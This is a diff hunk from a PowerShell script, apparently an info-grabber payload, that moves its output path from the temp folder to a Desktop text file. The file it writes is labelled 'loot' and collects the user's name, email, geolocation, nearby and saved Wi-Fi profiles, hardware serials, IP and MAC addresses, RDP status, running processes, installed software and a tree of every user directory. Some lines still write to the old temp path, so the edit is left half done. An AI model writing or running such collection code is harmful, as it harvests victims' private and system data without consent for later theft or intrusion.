@@ -217,7 +217,7 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 
 # MAKE LOOT FOLDER 
 
-$FileName = "$env:HOMEPATH"\Desktop\test"
+$FileName = "$env:HOMEPATH\Desktop\test.txt"
 
 ############################################################################################################################################################
 
@@ -226,93 +226,93 @@ $FileName = "$env:HOMEPATH"\Desktop\test"
 Clear-Host
 Write-Host 
 
-echo "Name:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $FN >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "Email:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
+echo "Name:" >> $FileName
+echo "==================================================================" >> $FileName
+echo $FN >> $FileName
+echo "" >> $FileName
+echo "Email:" >> $FileName
+echo "==================================================================" >> $FileName
 echo $EM >> $env:TMP\$FileName
 echo "" >> $env:TMP\$FileName
 echo "GeoLocation:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $GL >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-echo "Nearby Wifi:" >> $env:TMP\$FileName
-echo "==================================================================" >> $env:TMP\$FileName
-echo $NearbyWifi >> $env:TMP\$FileName
-echo "" >> $env:TMP\$FileName
-$computerSystem.Name >> $env:TMP\$FileName
+echo "==================================================================" >> $FileName
+echo $GL >> $FileName
+echo "" >> $FileName
+echo "Nearby Wifi:" >> $FileName
+echo "==================================================================" >> $FileName
+echo $NearbyWifi >> $FileName
+echo "" >> $FileName
+$computerSystem.Name >> $FileName
 "==================================================================
-Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
-"Model: " + $computerSystem.Model >> $env:TMP\$FileName
-"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
+Manufacturer: " + $computerSystem.Manufacturer >> $FileName
+"Model: " + $computerSystem.Model >> $FileName
+"Serial Number: " + $computerBIOS.SerialNumber >> $FileName
+"" >> $FileName
+"" >> $FileName
+"" >> $FileName
 
 "OS:
-=================================================================="+ ($computerOs |out-string) >> $env:TMP\$FileName
+=================================================================="+ ($computerOs |out-string) >> $FileName
 
 "CPU:
-=================================================================="+ ($computerCpu| out-string) >> $env:TMP\$FileName
+=================================================================="+ ($computerCpu| out-string) >> $FileName
 
 "RAM:
 ==================================================================
 Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$FileName
 
 "Mainboard:
-=================================================================="+ ($computerMainboard| out-string) >> $env:TMP\$FileName
+=================================================================="+ ($computerMainboard| out-string) >> $FileName
 
 "Bios:
-=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $env:TMP\$FileName
+=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $FileName
 
 
 "Local-user:
-=================================================================="+ ($luser| out-string) >> $env:TMP\$FileName
+=================================================================="+ ($luser| out-string) >> $FileName
 
 "HDDs:
-=================================================================="+ ($Hdds| out-string) >> $env:TMP\$FileName
+=================================================================="+ ($Hdds| out-string) >> $FileName
 
 "COM & SERIAL DEVICES:
-==================================================================" + ($COMDevices | Out-String) >> $env:TMP\$FileName
+==================================================================" + ($COMDevices | Out-String) >> $FileName
 
 "Network: 
 ==================================================================
-Computers MAC address: " + $MAC >> $env:TMP\$FileName
-"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
-"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
-"RDP: " + $RDP >> $env:TMP\$FileName
-"" >> $env:TMP\$FileName
-($Network| out-string) >> $env:TMP\$FileName
+Computers MAC address: " + $MAC >> $FileName
+"Computers IP address: " + $computerIP.ipaddress[0] >> $FileName
+"Public IP address: " + $computerPubIP >> $FileName
+"RDP: " + $RDP >> $FileName
+"" >> $FileName
+($Network| out-string) >> $FileName
 
 "W-Lan profiles: 
-=================================================================="+ ($WLANProfileObjects| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($WLANProfileObjects| Out-String) >> $FileName
 
 "listeners / ActiveTcpConnections
-=================================================================="+ ($listener| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($listener| Out-String) >> $FileName
 
 "Current running process: 
-=================================================================="+ ($process| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($process| Out-String) >> $FileName
 
 "Services: 
-=================================================================="+ ($service| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($service| Out-String) >> $FileName
 
 "Installed software:
-=================================================================="+ ($software| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($software| Out-String) >> $FileName
 
 "Installed drivers:
-=================================================================="+ ($drivers| Out-String) >> $env:TMP\$FileName
+=================================================================="+ ($drivers| Out-String) >> $FileName
 
 "Installed videocards:
-==================================================================" + ($videocard| Out-String) >> $env:TMP\$FileName
+==================================================================" + ($videocard| Out-String) >> $FileName
 
 
 ############################################################################################################################################################
 
 # Recon all User Directories
 #tree $Env:userprofile /a /f | Out-File -FilePath $Env:tmp\j-loot\tree.txt
-tree $Env:userprofile /a /f >> $env:TMP\$FileName
+tree $Env:userprofile /a /f >> $FileName
 
 ############################################################################################################################################################
 
